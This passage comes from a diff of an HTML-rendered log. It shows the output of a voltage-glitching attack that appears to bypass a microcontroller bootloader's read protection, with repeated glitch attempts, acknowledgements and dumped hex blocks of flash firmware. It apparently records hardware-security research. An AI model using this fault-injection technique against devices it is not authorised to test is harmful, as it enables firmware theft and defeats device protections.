+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000e0006
+</span></span><span style="display:flex;"><span>Result: 7903f00302fb695b0002fa03f3ba691343bb617b68ba691a603b685b6803f44033002b00f0a2800023fb60574b5b6c564a43f480435364544b5b6c03f48043fb60fb68524afb699b08023352f82330bb61fb6903f003039b000f2202fa03f3db43ba691340bb617b68494a934219d07b68484a934213d07b68474a93420dd07b68464a934207d07b68454a934201d1042308e0072306e0032304e0022302e0012300e00023fa6902f0030292009340ba691343bb613549fb699b080233ba6941f82320384b9b68bb613b69db43ba691340bb613b685b6803f48013002b03d0ba693b691343bb612f4abb6993602d4bdb68bb613b69db43ba691340bb613b685b
+</span></span><span style="display:flex;"><span>Bytes to read: 7903f00302fb695b0002fa03f3ba691343bb617b68ba691a603b685b6803f44033002b00f0a2800023fb60574b5b6c564a43f480435364544b5b6c03f48043fb60fb68524afb699b08023352f82330bb61fb6903f003039b000f2202fa03f3db43ba691340bb617b68494a934219d07b68484a934213d07b68474a93420dd07b68464a934207d07b68454a934201d1042308e0072306e0032304e0022302e0012300e00023fa6902f0030292009340ba691343bb613549fb699b080233ba6941f82320384b9b68bb613b69db43ba691340bb613b685b6803f48013002b03d0ba693b691343bb612f4abb6993602d4bdb68bb613b69db43ba691340bb613b685b
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18354</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221568 08000f0007
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000f0007
+</span></span><span style="display:flex;"><span>Result: 7903f40013002b03d0ba693b691343bb61244abb69d360234b5b68bb613b69db43ba691340bb613b685b6803f40033002b03d0ba693b691343bb611a4abb695360184b1b68bb613b69db43ba691340bb613b685b6803f48033002b03d0ba693b691343bb610f4abb691360fb690133fb61fb690f2b7ff6a2ae00bf00bf2437bd465df8047b704700bf0038024000380140000002400004024000080240000c024000100240003c014080b483b000af78600b467b8013467b707b78002b03d07a887b689a6103e07b881a047b689a6100bf0c37bd465df8047b7047000080b586b000af78607b68002b01d1012367e27b681b6803f00103002b75d0884b9b6803
+</span></span><span style="display:flex;"><span>Bytes to read: 7903f40013002b03d0ba693b691343bb61244abb69d360234b5b68bb613b69db43ba691340bb613b685b6803f40033002b03d0ba693b691343bb611a4abb695360184b1b68bb613b69db43ba691340bb613b685b6803f48033002b03d0ba693b691343bb610f4abb691360fb690133fb61fb690f2b7ff6a2ae00bf00bf2437bd465df8047b704700bf0038024000380140000002400004024000080240000c024000100240003c014080b483b000af78600b467b8013467b707b78002b03d07a887b689a6103e07b881a047b689a6100bf0c37bd465df8047b7047000080b586b000af78607b68002b01d1012367e27b681b6803f00103002b75d0884b9b6803
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18369</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221824 <span style="color:#bd93f9">0800100018</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800100018</span>
+</span></span><span style="display:flex;"><span>Result: 790c03042b0cd0854b9b6803f00c03082b12d1824b5b6803f48003b3f5800f0bd17e4b1b6803f40033002b5bd07b685b68002b57d1012342e27b685b68b3f5803f06d1764b1b68754a43f4803313601de07b685b68b3f5a02f0cd1704b1b686f4a43f4802313606d4b1b686c4a43f4803313600be0694b1b68684a23f480331360664b1b68654a23f4802313607b685b68002b13d0fff712fd386108e0fff70efd02463b69d31a642b01d9032307e25b4b1b6803f40033002bf0d014e0fff7fefc386108e0fff7fafc02463b69d31a642b01d90323f3e1514b1b6803f40033002bf0d100e000bf7b681b6803f00203002b63d04a4b9b6803f00c03002b0bd047
+</span></span><span style="display:flex;"><span>Bytes to read: 790c03042b0cd0854b9b6803f00c03082b12d1824b5b6803f48003b3f5800f0bd17e4b1b6803f40033002b5bd07b685b68002b57d1012342e27b685b68b3f5803f06d1764b1b68754a43f4803313601de07b685b68b3f5a02f0cd1704b1b686f4a43f4802313606d4b1b686c4a43f4803313600be0694b1b68684a23f480331360664b1b68654a23f4802313607b685b68002b13d0fff712fd386108e0fff70efd02463b69d31a642b01d9032307e25b4b1b6803f40033002bf0d014e0fff7fefc386108e0fff7fafc02463b69d31a642b01d90323f3e1514b1b6803f40033002bf0d100e000bf7b681b6803f00203002b63d04a4b9b6803f00c03002b0bd047
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18320</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222080 <span style="color:#bd93f9">0800110019</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800110019</span>
+</span></span><span style="display:flex;"><span>Result: 799b6803f00c03082b1cd1444b5b6803f48003002b16d1414b1b6803f00203002b05d07b68db68012b01d00123c7e13b4b1b6823f0f8027b681b69db00374913430b603ae07b68db68002b20d0344b01221a60fff7b3fc386108e0fff7affc02463b69d31a022b01d90323a8e12b4b1b6803f00203002bf0d0284b1b6823f0f8027b681b69db00254913430b6015e0244b00221a60fff792fc386108e0fff78efc02463b69d31a022b01d9032387e11b4b1b6803f00203002bf0d17b681b6803f00803002b36d07b685b69002b16d0154b01221a60fff772fc386108e0fff76efc02463b69d31a022b01d9032367e10b4b5b6f03f00203002bf0d01be0094b00
+</span></span><span style="display:flex;"><span>Bytes to read: 799b6803f00c03082b1cd1444b5b6803f48003002b16d1414b1b6803f00203002b05d07b68db68012b01d00123c7e13b4b1b6823f0f8027b681b69db00374913430b603ae07b68db68002b20d0344b01221a60fff7b3fc386108e0fff7affc02463b69d31a022b01d90323a8e12b4b1b6803f00203002bf0d0284b1b6823f0f8027b681b69db00254913430b6015e0244b00221a60fff792fc386108e0fff78efc02463b69d31a022b01d9032387e11b4b1b6803f00203002bf0d17b681b6803f00803002b36d07b685b69002b16d0154b01221a60fff772fc386108e0fff76efc02463b69d31a022b01d9032367e10b4b5b6f03f00203002bf0d01be0094b00
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18301</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222336 080012001a
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080012001a
+</span></span><span style="display:flex;"><span>Result: 791a60fff75bfc38610ee0fff757fc02463b69d31a022b07d9032350e10038024000004742800e4742884b5b6f03f00203002bead17b681b6803f00403002b00f097800023fb75814b1b6c03f08053002b0fd10023bb607d4b1b6c7c4a43f0805313647a4b1b6c03f08053bb60bb680123fb75774b1b6803f48073002b18d1744b1b68734a43f480731360fff717fc386108e0fff713fc02463b69d31a022b01d903230ce16a4b1b6803f48073002bf0d07b689b68012b06d1644b1b6f634a43f0010313671ce07b689b68052b0cd15f4b1b6f5e4a43f0040313675c4b1b6f5b4a43f0010313670be0584b1b6f574a23f001031367554b1b6f544a23f0040313
+</span></span><span style="display:flex;"><span>Bytes to read: 791a60fff75bfc38610ee0fff757fc02463b69d31a022b07d9032350e10038024000004742800e4742884b5b6f03f00203002bead17b681b6803f00403002b00f097800023fb75814b1b6c03f08053002b0fd10023bb607d4b1b6c7c4a43f0805313647a4b1b6c03f08053bb60bb680123fb75774b1b6803f48073002b18d1744b1b68734a43f480731360fff717fc386108e0fff713fc02463b69d31a022b01d903230ce16a4b1b6803f48073002bf0d07b689b68012b06d1644b1b6f634a43f0010313671ce07b689b68052b0cd15f4b1b6f5e4a43f0040313675c4b1b6f5b4a43f0010313670be0584b1b6f574a23f001031367554b1b6f544a23f0040313
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18308</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222592 080013001b
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080013001b
+</span></span><span style="display:flex;"><span>Result: 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18304</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222592 080013001b
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080013001b
+</span></span><span style="display:flex;"><span>Result: 1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18316</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222592 080013001b
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080013001b
+</span></span><span style="display:flex;"><span>Result: 1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18328</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222592 080013001b
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080013001b
+</span></span><span style="display:flex;"><span>Result: 797b689b68002b15d0fff7d8fb38610ae0fff7d4fb02463b69d31a41f28832934201d90323cbe0494b1b6f03f00203002beed014e0fff7c2fb38610ae0fff7befb02463b69d31a41f28832934201d90323b5e03e4b1b6f03f00203002beed1fb7d012b05d1394b1b6c384a23f0805313647b689b69002b00f0a180344b9b6803f00c03082b5cd07b689b69022b41d1314b00221a60fff792fb386108e0fff78efb02463b69d31a022b01d9032387e0274b1b6803f00073002bf0d17b68da697b681b6a1a437b685b6a9b011a437b689b6a5b08013b1b041a437b68db6a1b061b4913434b601b4b01221a60fff767fb386108e0fff763fb02463b69d31a022b01
+</span></span><span style="display:flex;"><span>Bytes to read: 797b689b68002b15d0fff7d8fb38610ae0fff7d4fb02463b69d31a41f28832934201d90323cbe0494b1b6f03f00203002beed014e0fff7c2fb38610ae0fff7befb02463b69d31a41f28832934201d90323b5e03e4b1b6f03f00203002beed1fb7d012b05d1394b1b6c384a23f0805313647b689b69002b00f0a180344b9b6803f00c03082b5cd07b689b69022b41d1314b00221a60fff792fb386108e0fff78efb02463b69d31a022b01d9032387e0274b1b6803f00073002bf0d17b68da697b681b6a1a437b685b6a9b011a437b689b6a5b08013b1b041a437b68db6a1b061b4913434b601b4b01221a60fff767fb386108e0fff763fb02463b69d31a022b01
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18348</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222848 080014001c
+</span></span><span style="display:flex;"><span>Result 1f1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18301</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134222848 080014001c
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080014001c
+</span></span><span style="display:flex;"><span>Result: 7903235ce0114b1b6803f00073002bf0d054e0104b00221a60fff750fb386108e0fff74cfb02463b69d31a022b01d9032345e0064b1b6803f00073002bf0d13de07b689b69012b07d1012338e00038024000700040600047421b4b5b68fb607b689b69012b28d0fb6803f480027b68db699a4221d1fb6803f03f027b681b6a9a421ad1fa6847f6c07313407a68526a9201934211d1fb6803f440327b689b6a5b08013b1b049a4207d1fb6803f070627b68db6a1b069a4201d0012300e0002318461837bd4680bd00bf0038024080b584b000af786039607b68002b01d10123cce0684b1b6803f007033a689a420cd9654b3a68d2b21a70634b1b6803f007033a
+</span></span><span style="display:flex;"><span>Bytes to read: 7903235ce0114b1b6803f00073002bf0d054e0104b00221a60fff750fb386108e0fff74cfb02463b69d31a022b01d9032345e0064b1b6803f00073002bf0d13de07b689b69012b07d1012338e00038024000700040600047421b4b5b68fb607b689b69012b28d0fb6803f480027b68db699a4221d1fb6803f03f027b681b6a9a421ad1fa6847f6c07313407a68526a9201934211d1fb6803f440327b689b6a5b08013b1b049a4207d1fb6803f070627b68db6a1b069a4201d0012300e0002318461837bd4680bd00bf0038024080b584b000af786039607b68002b01d10123cce0684b1b6803f007033a689a420cd9654b3a68d2b21a70634b1b6803f007033a
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18355</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223104 080015001d
+</span></span><span style="display:flex;"><span>Result 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18316</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223104 080015001d
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080015001d
+</span></span><span style="display:flex;"><span>Result: 799a4201d00123b8e07b681b6803f00203002b20d07b681b6803f00403002b05d0594b9b68584a43f4e05393607b681b6803f00803002b05d0534b9b68524a43f460439360504b9b6823f0f0027b689b684d4913438b607b681b6803f00103002b44d07b685b68012b07d1474b1b6803f40033002b19d101237fe07b685b68022b03d07b685b68032b07d13f4b1b6803f00073002b09d101236fe03b4b1b6803f00203002b01d1012367e0374b9b6823f003027b685b68344913438b60fff77efaf8600ae0fff77afa0246fb68d31a41f28832934201d903234fe02b4b9b6803f00c027b685b689b009a42ebd1254b1b6803f007033a689a420cd2224b3a68d2
+</span></span><span style="display:flex;"><span>Bytes to read: 799a4201d00123b8e07b681b6803f00203002b20d07b681b6803f00403002b05d0594b9b68584a43f4e05393607b681b6803f00803002b05d0534b9b68524a43f460439360504b9b6823f0f0027b689b684d4913438b607b681b6803f00103002b44d07b685b68012b07d1474b1b6803f40033002b19d101237fe07b685b68022b03d07b685b68032b07d13f4b1b6803f00073002b09d101236fe03b4b1b6803f00203002b01d1012367e0374b9b6823f003027b685b68344913438b60fff77efaf8600ae0fff77afa0246fb68d31a41f28832934201d903234fe02b4b9b6803f00c027b685b689b009a42ebd1254b1b6803f007033a689a420cd2224b3a68d2
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18351</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223360 080016001e
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080016001e
+</span></span><span style="display:flex;"><span>Result: 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18357</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223360 080016001e
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080016001e
+</span></span><span style="display:flex;"><span>Result: 791a70204b1b6803f007033a689a4201d0012332e07b681b6803f00403002b08d0194b9b6823f4e0527b68db68164913438b607b681b6803f00803002b09d0124b9b6823f460427b681b69db000e4913438b6000f021f802460b4b9b681b0903f00f030a49cb5c22fa03f3094a1360094b1b681846fff7def9002318461037bd4680bd00bf003c024000380240c022000810000020140000202de9b04f90b000af00237b630023fb6300233b630023bb63594b9b6803f00c03082b0dd0082b00f2a180002b02d0042b03d09be0534bbb639be0534bbb6398e04f4b5b6803f03f037b634d4b5b6803f48003002b28d04a4b5b689b0900223b627a623b6ac3f308
+</span></span><span style="display:flex;"><span>Bytes to read: 791a70204b1b6803f007033a689a4201d0012332e07b681b6803f00403002b08d0194b9b6823f4e0527b68db68164913438b607b681b6803f00803002b09d0124b9b6823f460427b681b69db000e4913438b6000f021f802460b4b9b681b0903f00f030a49cb5c22fa03f3094a1360094b1b681846fff7def9002318461037bd4680bd00bf003c024000380240c022000810000020140000202de9b04f90b000af00237b630023fb6300233b630023bb63594b9b6803f00c03082b0dd0082b00f2a180002b02d0042b03d09be0534bbb639be0534bbb6398e04f4b5b6803f03f037b634d4b5b6803f48003002b28d04a4b5b689b0900223b627a623b6ac3f308
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18309</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223616 080017001f
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080017001f
+</span></span><span style="display:flex;"><span>Result: 790021474b03fb01f2002300fb03f31344434aa0fb0212fa620a46ba62fa6a1344fb627b6b0022bb61fa61d7e90623d7e90a01fef761fd02460b461346fb6353e0354b5b689b0900223b617a613b69c3f3080a4ff0000b52465b464ff000004ff00001590141ead261500102460b46b2eb0a0863eb0b094ff000024ff000034fea891343ea98634fea8812b2eb080463eb09054ff000024ff00003eb0043ea5473e20014461d4614eb0a033b6045eb0b037b604ff000024ff00003d7e9004529468b02214643ea915321468a02104619467b6b0022bb60fa60d7e90223fef70cfd02460b461346fb630b4b5b681b0c03f0030301335b003b63fa6b3b6bb2fbf3
+</span></span><span style="display:flex;"><span>Bytes to read: 790021474b03fb01f2002300fb03f31344434aa0fb0212fa620a46ba62fa6a1344fb627b6b0022bb61fa61d7e90623d7e90a01fef761fd02460b461346fb6353e0354b5b689b0900223b617a613b69c3f3080a4ff0000b52465b464ff000004ff00001590141ead261500102460b46b2eb0a0863eb0b094ff000024ff000034fea891343ea98634fea8812b2eb080463eb09054ff000024ff00003eb0043ea5473e20014461d4614eb0a033b6045eb0b037b604ff000024ff00003d7e9004529468b02214643ea915321468a02104619467b6b0022bb60fa60d7e90223fef70cfd02460b461346fb630b4b5b681b0c03f0030301335b003b63fa6b3b6bb2fbf3
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18359</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134223872 <span style="color:#bd93f9">0800180010</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800180010</span>
+</span></span><span style="display:flex;"><span>Result: 79bb6302e0054bbb6300bfbb6b18464037bd46bde8b08f00bf003802400024f40040787d0180b400af034b1b681846bd465df8047b704700bf1000002080b500affff7f0ff0246054b9b689b0a03f007030349cb5c22fa03f3184680bd00380240d022000880b500affff7dcff0246054b9b685b0b03f007030349cb5c22fa03f3184680bd00380240d022000880b582b000af78607b68002b01d1012342e07b6893f84130dbb2002b06d17b68002283f840207868fef7e8ff7b68242283f841207b681b68da687b681b6822f40052da60786800f009fa7b681b681a697b681b6822f490421a617b681b685a697b681b6822f02a025a617b681b68da687b681b
+</span></span><span style="display:flex;"><span>Bytes to read: 79bb6302e0054bbb6300bfbb6b18464037bd46bde8b08f00bf003802400024f40040787d0180b400af034b1b681846bd465df8047b704700bf1000002080b500affff7f0ff0246054b9b689b0a03f007030349cb5c22fa03f3184680bd00380240d022000880b500affff7dcff0246054b9b685b0b03f007030349cb5c22fa03f3184680bd00380240d022000880b582b000af78607b68002b01d1012342e07b6893f84130dbb2002b06d17b68002283f840207868fef7e8ff7b68242283f841207b681b68da687b681b6822f40052da60786800f009fa7b681b681a697b681b6822f490421a617b681b685a697b681b6822f02a025a617b681b68da687b681b
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18350</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224128 <span style="color:#bd93f9">0800190011</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800190011</span>
+</span></span><span style="display:flex;"><span>Result: 7942f40052da607b6800225a647b68202283f841207b68202283f842207b6800225a63002318460837bd4680bd80b58ab002aff860b9603b601346fb8000237b61fb6893f84130dbb2202b75d1bb68002b02d0fb88002b01d101236ee0fb6800225a64fb68212283f84120fff7a7f87861fb68fa889a84fb68fa88da84fb689b68b3f5805f08d1fb681b69002b04d10023fb61bb68bb6103e0bb68fb610023bb612ee03b6800937b6900228021f86800f0dff80346002b05d0fb68202283f8412003233ae0fb69002b0bd1bb691b881a46fb681b68c2f308025a60bb690233bb6107e0fb691a78fb681b685a60fb690133fb61fb68db8c9bb2013b9ab2fb68da
+</span></span><span style="display:flex;"><span>Bytes to read: 7942f40052da607b6800225a647b68202283f841207b68202283f842207b6800225a63002318460837bd4680bd80b58ab002aff860b9603b601346fb8000237b61fb6893f84130dbb2202b75d1bb68002b02d0fb88002b01d101236ee0fb6800225a64fb68212283f84120fff7a7f87861fb68fa889a84fb68fa88da84fb689b68b3f5805f08d1fb681b69002b04d10023fb61bb68bb6103e0bb68fb610023bb612ee03b6800937b6900228021f86800f0dff80346002b05d0fb68202283f8412003233ae0fb69002b0bd1bb691b881a46fb681b68c2f308025a60bb690233bb6107e0fb691a78fb681b685a60fb690133fb61fb68db8c9bb2013b9ab2fb68da
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18332</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224384 08001a0012
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001a0012
+</span></span><span style="display:flex;"><span>Result: 79fb68db8c9bb2002bcbd13b6800937b6900224021f86800f0abf80346002b05d0fb68202283f84120032306e0fb68202283f84120002300e0022318462037bd4680bd80b58ab002aff860b9603b601346fb8000237b61fb6893f84230dbb2202b40f08180bb68002b02d0fb88002b01d1012379e0fb6800225a64fb68222283f84220fb6800221a63fff718f87861fb68fa889a85fb68fa88da85fb689b68b3f5805f08d1fb681b69002b04d10023fb61bb68bb6103e0bb68fb610023bb6147e03b6800937b6900222021f86800f050f80346002b05d0fb68202283f84220032342e0fb69002b0cd1fb681b685b689bb2c3f308039ab2bb691a80bb690233bb
+</span></span><span style="display:flex;"><span>Bytes to read: 79fb68db8c9bb2002bcbd13b6800937b6900224021f86800f0abf80346002b05d0fb68202283f84120032306e0fb68202283f84120002300e0022318462037bd4680bd80b58ab002aff860b9603b601346fb8000237b61fb6893f84230dbb2202b40f08180bb68002b02d0fb88002b01d1012379e0fb6800225a64fb68222283f84220fb6800221a63fff718f87861fb68fa889a85fb68fa88da85fb689b68b3f5805f08d1fb681b69002b04d10023fb61bb68bb6103e0bb68fb610023bb6147e03b6800937b6900222021f86800f050f80346002b05d0fb68202283f84220032342e0fb69002b0cd1fb681b685b689bb2c3f308039ab2bb691a80bb690233bb
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18368</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224640 08001b0013
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18310</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134224640 08001b0013
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08001b0013
